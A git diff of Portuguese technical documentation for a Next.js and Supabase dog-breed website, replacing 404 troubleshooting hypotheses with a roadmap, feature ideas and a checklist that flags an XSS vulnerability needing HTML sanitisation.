+- [ ] **Melhorar tratamento de erros**
+  - [ ] Diferenciar tipos de erro (não encontrado vs. conexão)
+  - [ ] Implementar logging adequado (Sentry, LogRocket)
+  - [ ] Remover `console.error` em produção
 
-**Como Verificar:**
-- Verificar se existe arquivo `.env.local` ou `.env`
-- Verificar se as variáveis estão definidas:
-  ```bash
-  echo $NEXT_PUBLIC_SUPABASE_URL
-  echo $NEXT_PUBLIC_SUPABASE_ANON_KEY
-  ```
+- [ ] **Implementar fallback na página 404**
+  - [ ] Melhorar tratamento de erro em `app/not-found.tsx`
+  - [ ] Garantir que sempre funcione mesmo se Supabase falhar
 
-**Solução:**
-- Criar arquivo `.env.local` na raiz do projeto:
-  ```
-  NEXT_PUBLIC_SUPABASE_URL=https://seu-projeto.supabase.co
-  NEXT_PUBLIC_SUPABASE_ANON_KEY=sua-anon-key
-  ```
+### Tarefas de Melhoria (Prioridade Baixa)
 
-#### 🎯 **Hipótese 3: Problemas de Row Level Security (RLS)**
-**Probabilidade:** 50%
+- [ ] **Adicionar validação de tipos em runtime**
+  - [ ] Instalar Zod ou Yup
+  - [ ] Criar schemas de validação para `Page` e `Breed`
+  - [ ] Validar dados do Supabase
 
-**Cenário:**
-- O Supabase tem RLS habilitado na tabela `pages`
-- A `ANON_KEY` não tem permissão para ler a tabela
-- A query retorna erro de permissão → `null`
+- [ ] **Implementar cache**
+  - [ ] Cache de páginas estáticas (ISR)
+  - [ ] Cache de raças
+  - [ ] Reduzir requisições ao Supabase
 
-**Como Verificar:**
-- Verificar políticas RLS no Supabase Dashboard
-- Verificar logs de erro no console do navegador (DevTools)
-- Verificar logs do Supabase
+- [ ] **Adicionar testes**
+  - [ ] Testes unitários para funções de dados
+  - [ ] Testes de integração para rotas
+  - [ ] Testes E2E para fluxos principais
 
-**Solução:**
-- Criar política RLS para permitir SELECT público:
-  ```sql
-  CREATE POLICY "Allow public read access" ON pages
-  FOR SELECT USING (true);
-  ```
+- [ ] **Melhorar SEO**
+  - [ ] Adicionar metadata dinâmica em `app/[slug]/page.tsx`
+  - [ ] Adicionar Open Graph tags
+  - [ ] Adicionar sitemap.xml
+  - [ ] Adicionar robots.txt
 
-#### 🎯 **Hipótese 4: Página Existe Mas com Status "draft"**
-**Probabilidade:** 40%
+- [ ] **Otimizar imagens**
+  - [ ] Verificar uso de `unoptimized` (pode impactar performance)
+  - [ ] Implementar lazy loading onde apropriado
+  - [ ] Usar formato WebP/AVIF
 
-**Cenário:**
-- A página "sobre" existe mas tem `status = "draft"`
-- ⚠️ **Se RLS bloquear rascunhos**, a query não retorna nada
-- Se RLS permitir, a página seria exibida mesmo sendo rascunho
+---
 
-**Como Verificar:**
-```sql
-SELECT slug, status FROM pages WHERE slug = 'sobre';
-```
+## 💡 Novas Ideias e Melhorias
 
-**Solução:**
-- Alterar status para "published"
-- ⚠️ **Nota:** A verificação de status agora ocorre no componente `app/[slug]/page.tsx` (linha 13)
+### Funcionalidades Sugeridas
 
-#### 🎯 **Hipótese 5: Erro de Conexão/Tempo Limite**
-**Probabilidade:** 20%
+#### 1. 🎯 Sistema de Busca Avançada
 
-**Cenário:**
-- Supabase está temporariamente offline
-- Timeout na requisição
-- Erro não tratado → `null`
+**Descrição:** Busca inteligente com filtros múltiplos
 
-**Como Verificar:**
-- Verificar status do Supabase
-- Verificar logs do servidor Next.js
-- Testar conexão manual com o Supabase
+**Funcionalidades:**
+- Busca por nome, categoria, características
+- Filtros por tamanho, energia, facilidade de treinamento
+- Ordenação (popularidade, nome, categoria)
+- Sugestões de busca (autocomplete)
 
-**Solução:**
-- Implementar retry logic
-- Melhorar tratamento de erros
+**Implementação:**
+- Criar componente `AdvancedSearch.tsx`
+- Implementar filtros no backend (Supabase) ou client-side
+- Adicionar debounce na busca
 
-#### 🎯 **Hipótese 6: Tabela "pages" Não Existe**
-**Probabilidade:** 10%
+#### 2. 🎯 Comparador de Raças
 
-**Cenário:**
-- A tabela `pages` não foi criada no Supabase
-- Query retorna erro "relation does not exist"
-- Função retorna `null`
+**Descrição:** Comparar até 3 raças lado a lado
 
-**Como Verificar:**
-- Verificar tabelas no Supabase Dashboard
-- Verificar SQL Editor
+**Funcionalidades:**
+- Selecionar múltiplas raças
+- Visualização comparativa (tabela ou cards)
+- Comparação de estatísticas
+- Compartilhamento de comparação (URL)
 
-**Solução:**
-- Criar tabela `pages` com a estrutura correta
+**Implementação:**
+- Rota `/racas/compare?breeds=labrador,golden,husky`
+- Componente `BreedComparator.tsx`
+- Estado compartilhado via URL query params
+
+#### 3. 🎯 Favoritos de Raças
+
+**Descrição:** Sistema para salvar raças favoritas
+
+**Funcionalidades:**
+- Salvar raças favoritas (localStorage ou cookie)
+- Página `/favoritos`
+- Indicador visual nos cards
+
+**Implementação:**
+- Hook customizado `useFavorites()`
+- Persistência via localStorage
+- Página `/favoritos` para listar favoritos
+
+#### 4. 🎯 Calculadora de Necessidades
+
+**Descrição:** Calcular quantidade de comida, exercício, etc.
+
+**Funcionalidades:**
+- Input: raça, peso, idade, nível de atividade
+- Output: quantidade de comida diária, minutos de exercício
+- Recomendações personalizadas
+
+**Implementação:**
+- Rota `/calculadora`
+- Componente `NeedsCalculator.tsx`
+- Lógica de cálculo baseada em dados da raça
+
+#### 5. 🎯 Blog/Artigos
+
+**Descrição:** Seção de artigos sobre cuidados com cães
+
+**Funcionalidades:**
+- Listagem de artigos
+- Página de artigo individual
+- Categorias (saúde, alimentação, comportamento)
+- Busca e filtros
+
+**Implementação:**
+- Nova tabela `posts` no Supabase
+- Rotas `/blog` e `/blog/[slug]`
+- Componentes similares ao sistema de páginas
+
+#### 6. 🎯 Sistema de Avaliações/Reviews
+
+**Descrição:** Usuários podem avaliar raças
+
+**Funcionalidades:**
+- Avaliar raças (1-5 estrelas)
+- Comentários sobre a raça
+- Filtros por avaliação
+- Ranking de raças mais bem avaliadas
+
+**Implementação:**
+- Tabela `breed_reviews` no Supabase
+- Autenticação Supabase (opcional)
+- Componente `BreedReviews.tsx`
+
+#### 7. 🎯 Integração com Mapas (Canis/Centros)
+
+**Descrição:** Mapa de canis e centros de adoção próximos
+
+**Funcionalidades:**
+- Mapa interativo (Google Maps ou Mapbox)
+- Filtros por raça, localização
+- Informações de contato
+
+**Implementação:**
+- Integração com Google Maps API ou Mapbox
+- Componente `BreedLocations.tsx`
+- Dados de canis (supabase ou API externa)
+
+#### 8. 🎯 Sistema de Notificações
+
+**Descrição:** Notificações push para novidades
+
+**Funcionalidades:**
+- Notificar sobre novas raças adicionadas
+- Notificar sobre novos artigos
+- Newsletter semanal
+
+**Implementação:**
+- Integração com serviço de notificações (OneSignal, Pusher)
+- Backend para gerenciar assinaturas
+
+#### 9. 🎯 Modo Escuro (Dark Mode)
+
+**Descrição:** Tema escuro para o site
+
+**Funcionalidades:**
+- Toggle para alternar tema
+- Persistência da preferência
+- Transições suaves
+
+**Implementação:**
+- Context API para gerenciar tema
+- CSS variables para cores
+- localStorage para persistência
+
+#### 10. 🎯 PWA (Progressive Web App)
+
+**Descrição:** Transformar site em app instalável
+
+**Funcionalidades:**
+- Instalação no dispositivo
+- Funcionalidade offline (cache)
+- Ícone na tela inicial
+
+**Implementação:**
+- Configuração PWA no `next.config.ts`
+- Service Worker para cache
+- Manifest.json
+
+### Melhorias Técnicas
+
+#### 1. 🚀 Performance
+
+- **Image Optimization**: Remover `unoptimized` onde possível
+- **Code Splitting**: Lazy load de componentes pesados
+- **Bundle Analysis**: Analisar tamanho do bundle
+- **CDN**: Usar CDN para assets estáticos
+
+#### 2. 🚀 SEO
+
+- **Metadata Dinâmica**: Metadata por rota
+- **Structured Data**: Schema.org para raças
+- **Sitemap**: Gerar sitemap.xml automaticamente
+- **robots.txt**: Configurar crawlers
+
+#### 3. 🚀 Analytics
+
+- **Google Analytics**: Rastreamento de comportamento
+- **Supabase Analytics**: Analytics de queries
+- **Performance Monitoring**: Lighthouse CI
+
+#### 4. 🚀 Acessibilidade
+
+- **ARIA Labels**: Melhorar labels para leitores de tela
+- **Keyboard Navigation**: Navegação completa via teclado
+- **Color Contrast**: Verificar contraste de cores
+- **Alt Text**: Descrever todas as imagens
 
 ---
 
 ## ✅ Checklist Técnico
 
-### 🔴 Urgente (Fazer Primeiro)
+### Segurança
 
-- [ ] **Verificar se o slug "sobre" existe no Supabase**
-  - [ ] Abrir Supabase Dashboard
-  - [ ] Verificar tabela `pages`
-  - [ ] Buscar linha com `slug = "sobre"`
-  - [ ] Se não existir, criar a página
+- [ ] ✅ **Implementar sanitização de HTML** (XSS)
+- [ ] ✅ **Validar variáveis de ambiente**
+- [ ] ✅ **Revisar políticas RLS no Supabase**
+- [ ] ✅ **Implementar rate limiting**
+- [ ] ✅ **Remover logs sensíveis em produção**
 
-- [ ] **Verificar variáveis de ambiente**
-  - [ ] Verificar se `.env.local` existe
-  - [ ] Verificar se `NEXT_PUBLIC_SUPABASE_URL` está definido
-  - [ ] Verificar se `NEXT_PUBLIC_SUPABASE_ANON_KEY` está definido
-  - [ ] Testar valores manualmente
+### Código
 
-- [ ] **Verificar políticas RLS no Supabase**
-  - [ ] Abrir Supabase Dashboard → Authentication → Policies
-  - [ ] Verificar se há política de SELECT na tabela `pages`
-  - [ ] Se não houver, criar política pública de leitura
+- [ ] ✅ **Unificar cliente Supabase** (refatorar `breeds.ts`)
+- [ ] ✅ **Remover código duplicado** (Header/Footer legacy)
+- [ ] ✅ **Corrigir configuração Next.js** (hostname duplicado)
+- [ ] ✅ **Remover importações não utilizadas**
+- [ ] ✅ **Implementar validação de tipos** (Zod/Yup)
 
-### 🟡 Importante (Resolver Depois)
+### Funcionalidades
 
-- [x] ~~**Unificar função `getPageBySlug`**~~ ✅ **RESOLVIDO**
-  - [x] ✅ Arquivo mantido: `lib/data/pages.ts`
-  - [x] ✅ Filtro de status movido para componente (flexibilidade)
-  - [ ] ⚠️ Remover arquivo legacy `services/pages.ts`
+- [ ] ⏳ **Sistema de busca avançada**
+- [ ] ⏳ **Comparador de raças**
+- [ ] ⏳ **Favoritos de raças**
+- [ ] ⏳ **Calculadora de necessidades**
+- [x] ✅ **Sistema de blog/artigos** (implementado com dados estáticos)
+- [ ] ⏳ **Migrar blog para Supabase**
+- [ ] ⏳ **Busca e filtros no blog**
+- [ ] ⏳ **Modo escuro**
+- [ ] ⏳ **PWA**
 
-- [x] ~~**Unificar tipo `Page`**~~ ✅ **RESOLVIDO**
-  - [x] ✅ Tipo centralizado em `lib/types/pages.ts`
-  - [x] ✅ Baseado no novo schema do Supabase
-  - [ ] ⚠️ Atualizar `app/not-found.tsx` para usar novo tipo
+### Performance
 
-- [ ] **Adicionar validação de variáveis de ambiente**
-  - [ ] Criar função `validateEnv()` em `lib/env.ts`
-  - [ ] Chamar no início de `lib/supabase.ts`
-  - [ ] Lançar erro claro se variáveis estiverem faltando
+- [ ] ⏳ **Otimizar imagens** (remover unoptimized)
+- [ ] ⏳ **Implementar cache** (ISR)
+- [ ] ⏳ **Code splitting** (lazy load)
+- [ ] ⏳ **Bundle analysis**
 
-- [ ] **Melhorar tratamento de erros**
-  - [ ] Diferenciar "página não encontrada" de "erro de conexão"
-  - [ ] Retornar tipos específicos de erro
-  - [ ] Logs adequados (não apenas console.error)
+### SEO e Analytics
 
-### 🟢 Opcional (Melhorias)
+- [ ] ⏳ **Metadata dinâmica por rota**
+- [ ] ⏳ **Structured data** (Schema.org)
+- [ ] ⏳ **Sitemap.xml automático**
+- [ ] ⏳ **Google Analytics**
+- [ ] ⏳ **robots.txt**
 
-- [ ] **Resolver componente `Header.tsx` não utilizado**
-  - [ ] Decidir: usar componente ou manter inline
-  - [ ] Se manter inline, remover `components/Header.tsx`
-  - [ ] Se usar componente, substituir no layout
+### Testes
 
-- [ ] **Adicionar fallback na página `not-found.tsx`**
-  - [ ] Se busca do Supabase falhar, usar conteúdo local
-  - [ ] Evitar dependência total do Supabase para 404
+- [ ] ⏳ **Testes unitários** (funções de dados)
+- [ ] ⏳ **Testes de integração** (rotas)
+- [ ] ⏳ **Testes E2E** (fluxos principais)
 
-- [ ] **Adicionar testes**
-  - [ ] Testes unitários para `getPageBySlug`
-  - [ ] Testes de integração para rotas dinâmicas
-  - [ ] Testes E2E para fluxo completo
+### Documentação
 
-- [ ] **Adicionar documentação de API**
-  - [ ] Documentar estrutura da tabela `pages`
-  - [ ] Documentar endpoints/funções de serviço
-  - [ ] Criar guia de contribuição
+- [x] ✅ **Documentação técnica** (esta documentação)
+- [ ] ⏳ **README.md atualizado**
+- [ ] ⏳ **Guia de contribuição**
+- [ ] ⏳ **Documentação da API** (se houver)
 
 ---
 
@@ -941,38 +1517,59 @@ SELECT slug, status FROM pages WHERE slug = 'sobre';
 
 ### Estado Atual do Projeto
 
-- ✅ **Estrutura básica:** Bem organizada, segue padrões do Next.js App Router
-- ⚠️ **Roteamento dinâmico:** Implementado e refatorado (verificar se ainda retorna 404)
-- ⚠️ **Integração Supabase:** Configurada, mas sem validações robustas
-- ✅ **Service Layer:** ✅ **REFATORADO** - Organização clara em `lib/data/` e `lib/types/`
-- ✅ **Tipagem:** ✅ **RESOLVIDO** - Tipo `Page` unificado em `lib/types/pages.ts`
+✅ **Pontos Fortes:**
+- Arquitetura moderna com Next.js 16 App Router
+- TypeScript em todo o projeto
+- Separação clara de responsabilidades
+- Design responsivo e moderno
+- Animações suaves com Framer Motion
 
-### Causa Mais Provável do 404
+⚠️ **Pontos de Atenção:**
+- Vulnerabilidade XSS no blog (sanitização de HTML)
+- Inconsistência no cliente Supabase
+- Blog usa dados estáticos (migrar para Supabase no futuro)
+- Falta de validação de variáveis de ambiente
 
-**A página com slug "sobre" não existe no banco de dados Supabase**, ou as variáveis de ambiente não estão configuradas corretamente.
+### Prioridades Recomendadas
 
-### Próximos Passos Recomendados
+1. **URGENTE**: Corrigir vulnerabilidade XSS no blog
+2. **IMPORTANTE**: Unificar cliente Supabase
+3. **IMPORTANTE**: Validar variáveis de ambiente
+4. **FUTURO**: Migrar blog para Supabase (tabela `articles`)
+5. **FUTURO**: Implementar busca e filtros no blog
 
-1. **Imediato:** Verificar existência da página "sobre" no Supabase
-2. **Imediato:** Verificar/Configurar variáveis de ambiente
-3. **Curto Prazo:** ✅ **RESOLVIDO** - Refatoração do service layer concluída
-4. **Pendente:** Atualizar `app/not-found.tsx` para usar novo tipo `Page`
-5. **Pendente:** Remover arquivo legacy `services/pages.ts`
-6. **Médio Prazo:** Adicionar validações e melhorar tratamento de erros
+### Métricas do Projeto
+
+- **Total de Rotas**: 5 rotas
+- **Total de Componentes**: 15+ componentes
+- **Funções de Dados**: 3 funções principais
+- **Tipos/Interfaces**: 2 principais (Page, Breed)
+- **Tabelas Supabase**: 2 (pages, breeds)
 
 ---
 
 ## 📝 Notas Finais
 
-Esta documentação foi gerada através de análise estática do código. Para diagnóstico completo, recomenda-se:
+Esta documentação foi gerada através de análise completa do código. Recomendações:
 
-1. **Verificar logs do servidor Next.js** durante requisições a `/sobre`
-2. **Verificar console do navegador** (DevTools → Network) para ver requisições ao Supabase
-3. **Verificar logs do Supabase** no Dashboard para ver queries executadas
-4. **Testar conexão manual** ao Supabase usando a mesma `ANON_KEY`
+1. **Segurança**: Implementar sanitização de HTML imediatamente
+2. **Código**: Refatorar inconsistências (cliente Supabase)
+3. **Manutenção**: Limpar código duplicado
+4. **Melhorias**: Priorizar funcionalidades baseadas em demanda
+
+**Última atualização:** Dezembro 2024 - Sistema de Blog Implementado  
+**Versão do Projeto:** 0.2.0  
+**Mudanças Recentes:**
+- ✅ Sistema de Blog implementado (rotas, componentes, funções)
+- ✅ Navegação atualizada (Curiosidades → Blog)
+- ✅ Componentes legacy removidos
+- ✅ Integração de artigos na página inicial
+- ⚠️ Blog usa dados estáticos (migrar para Supabase no futuro)
+- ⚠️ Vulnerabilidade XSS no blog (sanitização necessária)
+
+**Próxima revisão:** Após correção da vulnerabilidade XSS e migração do blog para Supabase
 
 ---
 
-**Documentação gerada por:** Analyzer Técnico Sênior  
-**Última atualização:** Análise completa do projeto  
-**Versão do Projeto:** 0.1.0
+**Documentação gerada por:** Análise Técnica Completa  
+**Status:** ✅ Completa e Atualizada
